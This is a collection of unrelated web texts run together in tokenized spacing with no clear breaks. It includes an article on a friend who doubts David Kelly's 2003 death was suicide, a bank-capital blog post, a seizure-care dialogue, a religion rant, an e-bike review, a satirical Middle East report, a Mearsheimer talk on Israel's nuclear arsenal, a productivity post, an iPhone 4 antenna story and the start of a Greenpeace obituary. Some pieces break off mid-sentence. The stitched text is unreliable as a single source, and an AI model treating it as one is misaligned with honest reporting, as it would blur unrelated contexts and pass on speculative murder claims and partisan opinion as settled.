To help him deal with obfuscating Iraqi officials , he was assigned Pederson , a gifted linguist with the U.S. Air Force who also had secret , high - level links to American intelligence .
Beguiled by his mysterious younger colleague , Kelly asked if he could walk with Pederson at night .
And so an unlikely relationship blossomed on the dark streets of Baghdad .
That friendship deepened when , one night in 1998 , five years before the U.S. and Britain invaded , the pair shared a life - or - death experience on a stroll around the Iraqi capital .
Suddenly , a red laser dot appeared on the British scientist 's clothes over his heart : an unseen sniper had him in his sights .
The laser beam moved slowly upwards until it was trained on the centre of Kelly 's forehead .
Amid unbearable tension , the red dot remained t here for what seemed like an age .
The sniper did n't pull the trigger - it was simply a warning .
Iraqi officials brushed off the incident , sniggering that it was just ' kids playing around ' .
But Kelly knew his life was in grave danger , informing his younger companion that he had been told by intelligence sources that he was number three on a Saddam Hussein death list as a result of his work .
The late Dr David Kelly is pictured leaving The House of Commons , Tuesday July 15 , 2003 , after giving evidence to the Commons select committee .
Shrugging off the risks , he told Pederson he could n't abandon his mission , but that he expected to be found dead in the woods near his home in Oxfordshire , rather than in Iraq .
It was a claim he repeated to other close friends .
It turned out to be a chillingly accurate prediction .
Memories of those tense , heady days and nights came flooding back for Mai Pederson this week as the seventh anniversary of the death of David Kelly , her close friend and confidante , approaches on July 17 .
It is a tragedy which continues to be cloaked in controversy .
' We started out as work colleagues and he became like an older brother to me , ' she told me when we met this week in America .
' He was a man of impeccable integrity , honour , dignity and respect .
His family meant everything to him , as did his work .
' It is time the facts came out . '
Pederson has n't met with Kelly 's wife since his death , but Mrs Kelly did testify to the Hutton inquiry that Pederson was ' influential ' in his life and had become a family friend .
Kelly , as is now well - known , was found dead in the woods near his home in July 2003 , having supposedly used a blunt knife he'd had since he was a boy to hack into a tiny , deep vein and bleed to death - even though little blood was found at the scene .
Despite leaving no note for his wife or his beloved daughter , who was due to get married three months later , the government 's Hutton Inquiry into his death concluded in 2004 that Kelly committed suicide after being named as the source of a BBC report suggesting that Tony Blair 's spokesman ' sexed up ' intelligence about Saddam Hussein 's weapons of mass destruction in order to justify going to war against Iraq .
After repeated calls for a full inquest into Kelly 's death , the Labour government instead decided that official papers about the affair should be kept secret for an unprecedented 70 years - and , even more bizarrely , the reason for that decision is itself a state secret .
But now , amid signals that the new British coalition government may re-examine this utterly perplexing case , Kelly 's former translator - and spiritual soul - mate - has come forward to give the saga a dramatic , compelling new twist .
In damning evidence to the new attorney general , Dominic Grieve , who has indicated his ' concerns ' about the case , Pederson revealed that Kelly could not have killed himself by hacking into his wrist - because he could only move his arm with difficulty due to an old injury .
' He could n't even cut a steak , ' says Pederson , holding her own arm out stiffly to mimic his disability .
' He hurt his elbow and was incredibly weak in that arm . '
She also rubbished claims he had taken 29 Co-Proxamol painkiller pills before cutting his wrists , saying he struggled to swallow pills .
For Kelly suffered from ' unexplained dysphagia ' - a syndrome that can make it almost impossible to swallow pills , while food and other substances are ingested without a problem .
This has been confirmed by other friends .
Pederson recalls offering him a pill for a headache which he refused , saying he could n't swallow any pills and explaining he'd had the problem for years .
Speaking exclusively to the Mail , the twice - divorced Pederson - who is fluent in five languages - insisted that she was determined to honour the memory of a ' kind , brilliant man ' by unearthing the truth about who really killed him , saying : ' This cries out for a formal , independent and complete review .
' If that means stirring the ashes , so be it .
' The death of David Kelly is not just about him or about the tragedy for his family - it affects all of us .
The facts do n't add up and the responses from the British government do n't add up . '
More than anyone else - even , perhaps , including Janice , Dr Kelly 's widow - Pederson knows the truth about Kelly 's frame of mind at the time of his death , and , intriguingly , how he had even made plans for the future once the fuss over the BBC story had died down .
From the time in the late Nineties that they became acquainted , they made an unlikely pair .
He , introverted and studious ; she , Kuwaiti - born to Egyptian parents and vivacious .
According to an ex-husband , she was actually an American spy with eyes that could ' bewitch ' any man .
After meeting in Iraq in 1998 , right up to the day of Kelly 's death , the pair spent as much of their time together as possible .
When they were apart , they regularly kept in touch by phone and email .
Other staff on the UN weapons inspections team in Baghdad assumed the bearded , scruffy English scientist was as dull as he looked .
But after he started accompanying Pederson on her walks , she discovered a different side to Kelly .
While she listened in silence , she says , he chatted away animatedly about his wife and children and how he loved taking daily walks in the woods near his home .
She found it distracting and relaxing .
Indeed , the pair became as close as it's possible to be without sharing a bed .
In the following years , Kelly made frequent trips to America to see her ( he was often in the U.S. on UN business and for meetings with other top scientists ) .
He was also reputedly thinking about moving there permanently .
Between dozen of trips to Iraq on inspection tours , as Britain and America sought a legal case for war against Saddam , the pair met regularly at locations around the U.S from California to Alabama .
In a sign of just how deep their friendship went , Kelly was even officially registered as living at three houses Pederson owned in America .
This was , apparently , simply a favour to enable him to have US .
credit cards with an American mailing address .
A devout agnostic , Kelly decided to convert without informing his wife ­ to the Baha'i faith , of which Pederson was a follower .
He gave up alcohol and started attending Baha 'i meetings .
Not surprisingly , colleagues whispered that the pair were having an affair .
Could it have been true ?
' I did not have an affair with Dr Kelly , 'Pederson says firmly . '
His family meant everything to him .
I 'd met his wife and daughters .
' His work was his mistress . '
Now 49 , with piercing brown eyes , Pederson says the British academic - who was 20 years older - was not her type and it would , in any case , have been a court martial offence under U.S. military regulations to have an affair with a married man .
Yet her decision to submit this new dossier of evidence to the British government has reignited the politically charged debate about whether Kelly was murdered .
Already she has been attacked by John Rentoul , official biographer of the former prime minister ( and , ironically , a columnist for The Independent , which denounced the Hutton Inquiry ) , has branded publication of her claims as ' contemptible ' .
BBC journalist Tom Mangold , meanwhile , denounced Pederson as a conspiracy theorist who must ' believe in the tooth fairy ' and demanded to know why she had taken so long to speak out .
Yet Pederson has tried to give evidence ­ repeatedly .
In fact , less than a month after Kelly 's death , she agreed to meet two British detectives who flew out from London to question her .
She spent two days telling them all she knew about the case ­ and explaining why she believed the scientist could not possibly have committed suicide .
Yet , like many others in this saga of contradictory evidence and unanswered questions , her attempts to shed light on Kelly 's physical ­ as well as mental ­ condition have been repeatedly rebuffed .
Indeed , two days after British police interviewed her and promised she would not be named on account of her sensitive work with the military her name was leaked to the then Labour supporting Times newspaper and she was portrayed as a shadowy Mata Hari figure .
While his family say Kelly was depressed , Pederson says he was nothing of the kind .
He had even phoned her at the height of the drama surrounding the row about the leaks to the BBC about the ' sexed - up '
Iraq weapons dossier , cheerfully saying he was driving to a place in the West Country to escape the Press and that he would come out to see her in a couple of months .
Alarmed by the media attention after her identity was disclosed , Pederson moved in to Air Force accommodation to live in seclusion .
There , she privately offered to give evidence to the Hutton Inquiry on condition that her identity was disguised as it had been for British intelligence agents called to give evidence .
Hutton refused .
More recently , frustrated by the lack of action over her evidence , her Washington lawyer Mark Zaid sent a letter last year to Baroness Scotland , the then Labour Attorney General .
Receipt of the letter was acknowledged in a single line reply from her office .
But , again , nothing happened .
Now , however , Pederson hopes someone will finally listen .
And yesterday she received a much more sympathetic response from the office of new Attorney General Dominic Grieve , advising her to speak to the group of doctors currently launching their own legal challenge to make all documents relating to his death public .
She does not , she insists , have a ' smoking gun ' ­ evidence of who killed Kelly or why .
But she 's convinced he was murdered .
' None of it makes sense ­ anyone can see that , ' she says .
The suggestion that Kelly could have been murdered by British government agents seems preposterous .
But did the Establishment have evidence that a ' hit ' was planned against Kelly by Iraq and fail to act ?
There have been repeated rumours that police were aware he had gone missing long before his family reported him overdue from his walk .
Or could Iraqi exiles have silenced him because his claims ( about there being insufficient evidence of weapons build up to justify an invasion of their country ) were at odds with their desire to see Saddam deposed ?
In truth , Mai Pedersondoes n't know the answers .
But what she does know is that the official story has gaping holes .
She says : ' The more time that passes with the Government ignoring the contradictory evidence , the more conspiracy theories will grow ­and faith and trust in the Government will lessen .
Legitimate questions deserve answers .
' The British Government owes him , his family and the country the full truth , whatever that might be .
Dr Kelly can no longer speak , so we must do so for him . '
There is , of course , a way for the new government to try to put an end to the controversy ­ by seeking answers to the unanswered questions .
If there really is nothing to hide about the baffling death of Dr David Kelly , why , then , does so much remain hidden ?
Those China CDS are looking ever more attractive .
Earlier today , Bank of China , Asia ’s third - largest lender by market value , announced it plans to raise as much as 60 billion yuan ( $ 8.9 billion ) in a rights offer to replenish capital .
Bloomberg reports : " The lender will sell 1.1 shares for every 10 held , or as many as 19.56 billion shares in Shanghai and 8.36 billion in Hong Kong , a statement to the Hong Kong stock exchange showed today . "
This latest equity offering in a region already drowning in capital raises was enough to halt trading in BOC shares until July 5 as the response to it would hardly be considered favorable .
A sale by Bank of China would “ damage market sentiment and banking shares further because we ’ve already been flooded by share offerings , ” Tang Yayun , a Shanghai - based analyst at Northeast Securities Co. , said before the announcement .
“ This is a surprise given that they just completed a bond sale . ”
The bolded sentence is critical as it merely implies that the rot from the trillions in bad loans made to assorted house flippers , tulip sniffers , and opium den casino dwellers are finally coming home to roost .
Indeed , Bank of China 's capital adequacy ratio fell to 11.09 percent as of March 31 , below the minimum 11.5 percent required according to the China Banking Regulatory Commission .
The next wave of the solvency crisis tsunami has now officially made landfall in China .

“ In case I have a seizure do n’t touch me or keep me from moving .
Let my body beat how it wants . ”
“ Like a skyscraper sways in the wind ? ”
“ No .
If you keep my arm from seizing , or my head , you could permanently take away any movement in that part of my body .
By stopping me from convulsing freely , you ’re not letting my brain work how it thinks it should work and it could un - learn . ”
“ I see . ”
“ If I start seizing keep time .
Anywhere from 2 - 3 minutes and I do n’t have to go to the hospital .
But if I seize for like 5 minutes , that ’s more brain damage , which I do n’t need .
You can call an ambulance then , but try to get them to take me to the VA hospital because it ’s free then , and they have my record on file .
I keep a separate wallet on me with all my medical data .
Here ’s my VA card . ”
“ I ’ve seen this blue card before .
My stepfather has one . ”
“ If I start seizing try to take a video , or take a series of photos , because then my doctor can prescribe the medicine I need and take me off what I do n’t .
Like if I ’m frothing from the mouth , or my eyes roll back , that ’s useful information . ”
“ Should I keep your head safe ? ”
“ Use your judgment .
If I ’m beating the ground real hard , maybe slip a towel under my head .
Do n’t use a pillow .
And do n’t touch my head . ”
“ OK . ”

Born again Baldwin loses to Richard Dawkins
Normally I would link this directly to the original source , but I have something to say and I hope you will forgive me :
What is up with the Born Again celebrity nutters like Stephen Baldwin and their nonsense about being saved and denying evolution ?
I watched a morning show segment not too long ago that highlighted a 10 - year old Jesus Jumping “ preacher . ”
When asked by the host if a person who did good all his life would go to heaven , the little Bible Banger said :
“ Only if he is saved . ”
When asked the inevitable follow up , i.e. what if a really bad person who did really bad things all his life could go to heaven the little BullShitWalker said :
“ Yes .
If he is saved . ”
The inevitable final question from the host was :
“ So if a really good person does n’t “ embrace Jesus ” he wo n’t go to heaven but if a really bad person embraces Jesus he will go to heaven ? ”
The poor little kid said :
“ yes . ”
So that being said enjoy the video and hope that you are saved :

The Pedego Classic Comfort Cruiser pictured above is modelled after the bikes that were prevalent in the 1930 ’s with one small but important difference , these bikes have discreet electric motors built into the rear hub and a small lithium - ion battery pack mounted on the rear luggage tray .
Preferring to use balloon tires instead of suspension the PCCC ( that name is just too long to keep writing ) offers a smooth ride and the lithium - ion battery can keep propelling you along for 30 miles at 20 miles an hour , which means this bike is actually a potential daily transport option for people who live within 20 - 30 miles of the office , school or university – especially if they encounter traffic jams and road - related delays on a regular basis ( electric bikes zip past traffic jams with glorious impunity ) .
The bike features a number of brand name parts including Shimano SIS Index Shifters and Dia-Compe Brakes .
The 6 speed transmission mated to the brushless electric hub motor will have no trouble scooting you around town and up obnoxious hills even if you are n’t in the mood for pedalling .
The PCCC currently sells for $ 1,695 USD which makes it a surprisingly affordable electric vehicle ( less than 5 % the cost of a Nissan Leaf ) and the perfect zero-emissions neighbourhood cruiser .

Many of you know that I had surgery earlier this month .
This rant has been building for a week already so it 's time to let it out .
When ...
MIDDLE EAST — With the Iraq war in its fifth year , the war in Afghanistan in its sixth , and conflict between Israel and the rest of the region continuing unabated for more than half a century , intelligence sources are warning that a new wave of violence in the Middle East may soon blah blah blah , etc. etc. , you know the rest .
Yet another act of violence in response to something else terrible that occurred in , oh , let 's say Basra .

" Tensions in the region are extremely high , " said U.S. Ambassador to Iraq Ryan Crocker , who added the same old same old while answering reporters ' questions .
" We 're disappointed by the events of the last few months , but we 're confident that we 're about to [ yakety yakety yak ] . "
The U.N. has issued a strongly worded whatever denouncing someone or something presumably having to do with the vicious explosive things that raged across this , or shattered the predawn calm of that , or ripped suddenly through the other , killing umpteen innocent civilians in a Jerusalem bus or Beirut discotheque or Fallujah mosque or whatever it was this time .

Either a car bomb killed people or a car hit a roadside bomb , killing people .
In the aftermath of a whole series of incidents , there have also been troubling reports of just fill in the blanks .
Middle East experts say the still somehow worsening situation has inflamed age - old sectarian tensions between the Sunnis , Shiites , Semites , Kurds , Turks , Saudis , Persians , Wahhabis , radicals , extremists , Baathists , mullahs , clerics , et al , which is likely to lead to more gurgle - gurgle over the coming weeks and months .

A certain number of U.S. troops were also killed somewhere in some tragic fashion , while a much greater number were wounded .
Meanwhile , impoverished or oppressed supporters of whichever faction carried out the attack or ambush probably celebrated , angering an angry U.S. public that is already angry .
Locals are calling for an investigation into excessive force or outright corruption by military or political officials on one of the 15 sides of the various conflicts , although the implicated party has categorically denied wrongdoing , just like they always do , without fail , every time this happens , which is daily , it seems .
And in Afghanistan , the Taliban .
In Israel , Palestinians and Israelis escalated tensions and so on and so on ad infinitum , ad eternum , and some say , ad absurdum , and although Hamas released a statement condemning Israeli forces for the resulting civilian deaths , Israeli officials say the teens were armed with rocket launchers , though it does n't really matter .

Transcript of John J. Mearsheimer ’s remarks at the IRmep conference at the International Spy Museum " Israel ’s Nuclear Arsenal : Espionage , Opacity and Future " Washington , DC , 7/7/2010
What I want to do is ask four questions , and then answer them .
The first is , " why did Israel develop nuclear weapons to begin within the 1950s and 1960s ? "
Second , " does it make sense today for Israel to have a nuclear deterrent ? "
Third , " does opacity make good strategic sense for Israel ? "
" Does it matter for the United States ? "
And four , " is it in America ’s interest for Israel to have nuclear weapons ? "
Those are the four questions I want to answer .
You want to remember , when I answer those first two questions about why Israel developed nuclear weapons I ’m going to approach it from Israel ’s point of view .
This will become clear as I go along , but Israel and the United States are separate countries .
And sometimes what ’s good for Israel is not good for the United States .
On the question of Israel and nuclear weapons , let me start with a general point .
The reason that states want nuclear weapons in almost all cases is because they are the ultimate deterrent .
They make it almost impossible for an adversary or an opponent to attack your homeland and threaten the survival of your state for the obvious reason that if you have nuclear weapons and your survival is at risk , that ’s one clear circumstance under which you ’re likely to use those nuclear weapons .
Many people now argue , here in Washington especially , that nuclear weapons have offensive capability , and if Iran were to get nuclear weapons it could use those weapons to dominate the Gulf and establish hegemony in the region .
This is not a serious argument and of course there are not many serious arguments about Iran that take place here inside the beltway , as you well know .
But the idea that they ’re going to use nuclear weapons to dominate the Gulf , it ’s a laugher .
It ’s also important to understand , that even if you have nuclear weapons , it does n’t mean other countries wo n’t attack you .
Again , I ’m arguing that if you have nuclear weapons , they wo n’t attack your homeland and threaten your survival , but you want to remember that in 1973 even though Israel had nuclear weapons and the Syrians and Egyptians understood that Israel had nuclear weapons , those two Arab states did initiate the famous October War , or Yom Kippur War .
So nuclear deterrence has its limits .
I think a powerful case can be made that it made good strategic sense for Israel to acquire nuclear weapons in the 1950s and the 1960s .
Number one because of the strategic environment that they operated in , and number two for historical reasons .
Referring to the strategic environment , at that point in time and again we ’re talking about the 1950 ’s and early 1960 ’s when this program was set in motion Israel ’s conventional force relative to its neighbors was nowhere near as powerful as they now are .
The gap between the Israeli conventional forces and the neighbors ’ conventional forces was significant then , but nowhere near as great as it is today .
At the same time both Egypt and Syria for much of that period , had very close relations with the Soviet Union which was supplying them with arms .
And as most of you know , the " special relationship " between the United States and Israel did not get going until 1967 .
And I would argue that it was really not until the 1973 war that the special relationship really began to take off .
So relations between the United States and Israel were not very close at the time , the Soviet Union was a key player in the region , and Egypt and Syria were seen as client states of the Soviet Union and were quite formidable adversaries .
I do n’t want to overstate the case , nevertheless given that strategic environment and given the history of the Jews , especially in Europe , especially given the fact that the Holocaust was recent history at the time , you could understand full well why the Israelis wanted to acquire a nuclear weapon .
Had I been a national security advisor to David Ben-Gurion , I would have pushed him down the nuclear road , back in the 50s and the 60s .
The question though , and Sasha raised this , is whether it makes sense today for Israel to have a nuclear deterrent .
I think it ’s obvious that if Iran were to acquire nuclear weapons , it would make little sense for Israel to give up its nuclear deterrent .
In fact , you ’d never get the Israelis to do that .
But that ’s not the interesting question .
The interesting question is " what should Israel do if Iran abandons its nuclear enrichment capability and agrees to a comprehensive inspections regime ? "
Would it then make sense for Israel to give up its nuclear arsenal ?
I think the answer to that question is not open - and - shut .
But I think , on balance , a powerful case could be made or can be made that Israel would be better off abandoning its nuclear deterrent .
Now why do I say that ?
Well , the argument for not giving it up is that they now have the ultimate deterrent .
As you know , all states in the international system worry somewhat about their survival .
The Israelis worry about their survival probably more than any other state in the system for good reasons and bad reasons .
But nevertheless they worry .
And given that they worry , they have the ultimate deterrent ; a powerful case can be made that they should not give it up .
But I think there are more powerful arguments on the other side .
First of all , there is a fundamentally different strategic environment today than existed in the 1950s and 1960s .
And it ’s much more favorable from Israel ’s point of view .
The Soviet Union , as we all know , has gone away .
And it is not supplying either Egypt or Syria , or anybody in the neighborhood with meaningful conventional fighting force .
Furthermore , Egypt has changed its approach to dealing with Israel and is now effectively a relatively friendly state .
It is not an adversary of Israel like it was it the late 1950s throughout the 1960s as well .
If you look at what ’s happened with regard to the special relationship it ’s blossomed since 1973 and the United States and Israel today are basically joined at the hip .
That was n’t the case back then .
And related to that the United States has supplied Israel with the most up - to - date conventional weaponry in its arsenal .
And as a result of that fact combined with the fact that the Soviets are no longer supplying the Egyptians and the Syrians the gap between the Israelis on one hand and the Arab states on the other in terms of conventional weaponry is just enormous .
No state in its right mind would pick a fight with the Israelis .
And every time it looks like the Syrians and the Israelis might get into a fight , the Syrians are backtracking like the best quarterback or safety in the NFL .
It ’s really quite amazing .
Nobody in their right mind would pick a fight with the IDF .
So I think in terms of the strategic environment , conventional deterrence alone takes care of the Israelis .
The other important reason for thinking about getting rid of Israeli nuclear weapons is to discourage or prevent proliferation in the region .
I think the Israelis understand full well that there ’s significant pressure on Iran , there will eventually be significant pressure in Iraq , once we get out of there , especially if Iran develops nuclear weapons of its own , to get nuclear weapons .
You can posit plausible scenarios as to how nuclear proliferation occurs in the Middle East over the next fifty years .
And I think it ’s clearly not in Israel ’s interest to have nuclear proliferation .
I think given Israel ’s conventional superiority number one , number two given its close relationship with the United States that ’s not likely to change anytime soon .
And given the dangers associated with proliferation , I think the Israelis would be better off in a nuclear - free Middle East .
Of course , that ’s not going to happen .
The Israeli government is so far to the right and dominated by hard - liners to the point that ’s virtually unthinkable in the near future .
But nevertheless , I think a good case could be made for pursuing that policy .
Which brings me to the third question , the matter of opacity .
Does opacity make sense for Israel ?
And to a lesser extent , what are the consequences of opacity for the United States ?
Just let me say what I think we mean when we say " opacity . "
This is where a country has nuclear weapons , but it does n’t admit explicitly that it has those weapons , and it even hints that it might not have them .
Of course , this is what the Israelis have been doing for decades now .
My first question about opacity is who are you fooling ?
A very important question .
Who ’s being fooled here ?
It seems quite clear to me that the elites in the Arab world , the elites in Europe , and the elites in the United States and by elites I mean policy - makers , experts , and even the informed public ( people who pay attention to this when they go home at night and read the newspaper , and read books and magazines ) none of them are being fooled .
We all kind of figured out a long time ago that Israel has nuclear weapons .
And I ’ve never talked to any intelligent person who pays careful attention to Middle East politics who tried to pretend to me that Israel does n’t have nuclear weapons .
Indeed , we all talk as if Israel had nuclear weapons .
And , in fact , if you think about it , because the Israelis acquired those weapons for deterrence purposes , want policymakers in the Arab world , and want the Americans , and wanted the Soviets during the cold war , to know that they had nuclear weapons .
In fact I think they wanted them to be quite certain they had them , and to let them know that they would use them , because that ’s what makes deterrence work .
So I do n’t think you were fooling the experts .
Now one might argue that one of the advantages of this is just to create a little ambiguity in the minds of elites , and then in a crisis you drag out the weapons and make it clear that you would use them .
One could argue that this is what happened in the 1973 war .
But that ’s not a very smart strategy , because if you ’re the Israelis , you want to avoid crisis , you want to avoid the 1973 war .
So you want to make it pretty clear if not very clear to the elites that you have these things .
And they ’ve done that .
So again , the question is " who are they fooling ? "
One might argue that this policy is good for allowing the elites in the Arab and Islamic world especially in countries like Egypt , and Jordan and Saudi Arabia to resist pressure from the public .
Because when people down below begin to holler about the fact that Israel has nuclear weapons , the elites can say " it ’s not clear that they have nuclear weapons . "
So what this policy of opacity provides is " plausible deniability . "
I guess you can make that argument .
It was probably somewhat effective in the past .
But I do n’t think it ’s very effective now , in large part because of the Internet .
I ’m a big believer that the Internet has been a game changer .
If you rely on the mainstream media and mainstream publications for your information , you ’re not going to learn very much about Middle East politics when it comes to Israel .
But we have all these websites , blogs , and we have the Israeli press , and so forth and so on , we can just learn all sorts of things about the Israeli - Palestinian conflict , and Middle East politics more generally , that you ca n’t learn in the mainstream media here in the United States .
And the end result is that I think the cat is out of the bag on this one , and everyone kind of understands it .
So the Israelis can pretend , and we can pretend , that it does n’t matter , and that Israel does n’t have nuclear weapons .
But I do n’t think it buys you much .
Now , to pick up on Grant ’s comments .
He indicated that it may help in the United States , because it allows policymakers in Washington to pretend that Israel does n’t have nuclear weapons .
And he was complaining about the fact that this policy of opacity undermines accountability .
I do n’t think so .
I do n’t think it matters much at all , because there ’s no accountability for Israel on any issue .
You do n’t need opacity .
If I went to the Middle East , and visited Israel , and I was killed , somebody shot me , do you think there would be any accountability ?
Seriously .
If any of you went to the Middle East and were killed , do you think there would be accountability ?
There would n’t be .
This is how outrageous this situation is .
Just think about the [ USS ]
Liberty , think about Rachel Corrie , think about this Turkish - American who was just killed on the flotilla .
There ’s no accountability .
The Israelis can do almost anything and get away with it .
So the idea that opacity matters , I do n’t think so .
The lobby believes it can finesse any issue .
They ’ve never seen an issue that they ca n’t finesse .
Look at what they did with the Goldstone report .
I ’ve followed this issue very carefully , and he asked me to put my strategist ’s hat on .
As many of you know , I went to West Point , I was in the military for ten years , I cut my teeth in this business by doing military matters .
The first time I ever went to Israel was to study what happened in the ’ 67 , ’73 , 1956 , 1953 wars .
I can tell you in great detail how those wars were fought .
I followed what happened in Gaza in 2008 - 2009 .
Judge Goldstone , if anything , was too soft on the Israelis .
Anybody who followed this carefully know that he basically got the story right to the extent that he was wrong , he should have been tougher on the Israelis .
But you saw what happened to Judge Goldstone .
This is how powerful the lobby is .
Alan Dershowitz was correct when he said that " Jews of my generation created what is , perhaps , the most powerful interest group in the history of democracy . "
An enormously powerful interest group , so I do n’t think you want to put too much emphasis on opacity .
It matters on the margins , or it mattered once on the margins , but not very much .
Which brings me to the final subject .
Is it in America ’s interest for Israel to have nuclear weapons ?
Now , it ’s very important to understand that Israel ’s supporters in the United States go to enormous lengths to make the argument that there ’s no difference between Israel ’s interests and America ’s interests .
Because once you open the possibility that the two countries have different interests , then they ’re forced to choose , in a very public fashion .
And , of course , they ’ll invariably choose Israel ’s interests over America ’s interests and that is not something that they want to have happen in public .
This is why they ’ve gone to great lengths to create this situation where it looks like Obama and Netanyahu have patched up all their differences , to the extent that there are differences they ’ll be handled behind closed doors because they do n’t want those differences out in the open .
But , of course , as we all know no two countries have the same interests .
This has nothing to do with Israel , or the United States .
It ’s just the way international politics works .
There are going to be cases where it ’s in Israel ’s interest to do certain things , and not in America ’s interest to allow Israel to do those things .
And there is no issue I believe­where that is clearer than the nuclear issue .
As I made clear in my opening set of remarks , I do believe it was in Israel ’s interest to develop nuclear weapons .
By the way , I think it ’s in Iran ’s interest today to develop nuclear weapons .
If I was president Ahmadinejad ’s national security advisor , and he asked me what to do , I would tell him to acquire a nuclear deterrent .
Is that in America ’s interest ?
Absolutely not .
Iran and the United States have different interests .
No two states have the same interests .
I believe it was in Israel ’s interest to acquire nuclear weapons .
I ’m hardly surprised at all of the activities the Israelis engaged in , that Grant so eloquently described , that ’s the way states behave in the international system , and they go to great lengths to disguise their behavior .
But it was not then in America ’s interest for Israel to acquire nuclear weapons and it is not in our interest now for Israel to have nuclear weapons .
This is why , as Grant described , President Kennedy went to great lengths to prevent Israel from acquiring nuclear weapons and to get them to join the NPT .
And president Johnson a very , very interesting figure on this whole subject of US - Israeli relations­president Johnson may have been willing to give Israel a green light , or an orange light , however you want to characterize it but as we can see from Grant ’s comments and from reading the literature on this that down below all sorts of people were protesting .
All sorts of people in the national security establishment wanted to go to great lengths to stop Israel from acquiring nuclear weapons .
Because again it was n’t in our interest .
And the two best examples that show how it ’s not in our national interest are what happened during the 1973 war .
During that conflict , the Israelis looked like they were in dire straits for the first few days .
And they wanted the United States to immediately resupply them .
The Nixon administration said " no " because the Nixon administration judged quite correctly that once the Israelis recovered from the initial surprise that they would do very well .
And therefore the US government did not what to give the Israelis at that point more arms .
The Israelis then threatened to pull the nuclear weapons out , and began talking about using nuclear weapons .
That , not surprisingly , spooked the Americans who immediately began resupplying the Israelis even though they did not what to do that .
That ’s a form of nuclear coercion .
From Israel ’s point of view this was smart policy from our point of view it was not good .
The second example is what ’s been going on with regards to nuclear proliferation .
It ’s quite clear , and you see this from the recent review conference , that the fact that Israel has nuclear weapons again we ’re not fooling anybody with this opaque rhetoric the fact that Israel has nuclear weapons is making it very difficult for the United States to stem the tide on proliferation and to move to a nuclear free Middle East .
So again , it ’s just not in our interest and it would have been much better if from our point of view we could have prevented Israel from acquiring nuclear weapons .
Let me just conclude with a few words on where this situation is headed .
I actually believe the situation is going to get much worse over time .
I believe that we ’re not going to have an Israeli - Palestinian peace settlement .
I believe that talk of a two - state solution and all this talk about moving from " proximity talks " to " direct talks " is a charade .
I find it hard to believe that people in this town take this discussion seriously .
I think , at this point in time , that you ’re going to get a " Greater Israel , " and it either is , or is going to be , an apartheid state .
It is going to cause us enormous problems , in the Middle East , or in the Arab and Islamic world .
It is going to continue to keep relations between Israel and its neighbors in a troublesome state .
On the proliferation front , I would not be surprised if Iran and other countries continue to move down the nuclear road .
You already see the Jordanians expressing an interest in developing a signification nuclear enrichment capability .
It would be interesting to see if Turkey does .
As I said before , I think Iraq will want nuclear weapons if Iran has nuclear weapons .
It would be foolish not to from an Iraqi point of view .
A Middle East where more than one state has nuclear weapons makes me very , very nervous .
What of course all of this is going to point to is the fact that America ’s interests and Israel ’s interests are going to continue to diverge .
And the end result of that , back here in the United States , is that the lobby is going to have to work overtime to cover that up and make it look like everything is hunky - dory when in fact it ’s not .
And that has all sorts of negative consequences for domestic politics .
So I think things are very bad now but I ’m sad to say they ’re only going to get worse .

Questionable Failure ,
If it had been the thoughts of cats , the news would have surprised no one .
This post first appeared on June 23 , 2007
A neat little analysis by Ross Eisenbrey at the Economic Policy Institute may be difficult for union foes to explain away .
It shows the proportion of workers covered by collective bargaining agreements in major European countries and the US and then shows productivity growth country by country in the same group 1979 - 2005 .
Despite being the only nation in the bunch with low union representation , US productivity growth is merely middle - of - the - pack .
Now one can quibble slightly with Eisenbrey ’s presentation .
Rather than showing 2005 union representation , it would have been cleaner to show the average over the 1979 - 2005 period ( for example , during this time frame , US union membership dropped from 27 % to 12 % today .
It makes for a better comparison and in no way changes the outcome ) .
In fact , the dirty secret of this exercise is that , were GDP of the US computed on the same basis as in European countries included in this comparison , the US would almost certainly show lower productivity gains than any other nation in this group .
The reason is that , in 1980 , the US started adjusting its GDP figures to allow for the fact that computer and communications technology were becoming more powerful ( i.e. , even though buyers were paying less , they were getting considerably more utility ) .
No other country makes these so - called adjustments , using a hedonic price index .
And the cumulative distortion is massive .
In 2005 , economist / investment advisor Michael Shedlock contacted the Bureau of Economic Advisers and they supplied some dated information on hedonics ( including a spreadsheet ) .
He found that hedonic adjustment to GDP was 2.257 TRILLION dollars , or 22 % of then - current GDP .
Productivity is output per unit of labor .
To determine productivity of an entire economy , the numerator in the calculation is generally GDP .
So if we are alone among our peers in having an inflated GDP , that says were it computed on a comparable basis , our lower GDP would also result in lower productivity growth .
And since Shedlock ’s work indicated that our GDP is wildly overstated , so too is our productivity growth .
Maybe more unions are just the thing we need … …
From the Economic Policy Institute :
After days of being pilloried for the iPhone 4's antenna problems , Apple CEO Steve Jobs took to the stage in Cupertino , California to respond .
Jobs announced during the iPhone 4 press conference Friday that every iPhone 4 user will get a free Apple Bumper to help mitigate antenna problems .
This will apply to every user worldwide who buys an iPhone through September 30 .
i Phone 4 owners who have already purchased one of the $ 30 bumpers will get a full refund .
Users who do n't like the bumper solution and are still unhappy with the iPhone can bring it back for a full refund instead .
The antenna issue first popped up as the iPhone 4 began to ship in the US .
Users began narrowing down the problem to how the phone is held , with the problem occurring when users bridged the gap between the antenna sections on the bezel .
Although Apple issued a software update on Thursday to help adjust user expectations when it comes to signal strength , the signal drop still occurs .
Steve Jobs showing off Apple 's anechoic chamber where the company does its phone testing
That 's where the bumper comes in : in most cases , the bumper shields the hand from bridging the antenna and reducing signal strength .
Although the iPhone 4 will still suffer some interference when you hold it a certain way , Apple clearly believes the free bumpers will address the issue for a large majority of users .
During the press conference , Jobs went to great pains to point out that the iPhone 4 is not alone in having this issue , showing videos to the press of numerous phones from other manufacturers dropping in signal when held in a certain way .
Apple CEO
Steve Jobs claimed during the press conference that only one half of one percent of iPhone 4 owners had complained to AppleCare about the issue .
That works out to about 15,000 ( give or take ) of the 3 million people who have purchased iPhone 4s thus far .
Jobs also said that fewer people have bought iPhone 4 cases than 3GS cases , and insisted that the iPhone 4 drops fewer than one per 100 calls more than the iPhone 3GS .
In addition to the free bumpers , Jobs also said Apple plans to issue a fix for the proximity sensor problem that is causing some users to accidentally hang up calls when they put the device up to their heads .
We called Apple 's iPhone bumpers a ripoff at $ 30 , but it 's hard to argue with free .
Those of us on staff who already have bumpers plan to apply for the refund .
Feature story - 6 July , 2010
There 's an old joke that you can walk into any bar in Vancouver and find somebody claiming to be a Greenpeace founder .
If that somebody had been Jim Bohlen , however , then this claim would have been absolutely true .
It is with very deep sadness , then , that we have learned of Jim 's death on 5 July , 2010 , at the age of 84 .
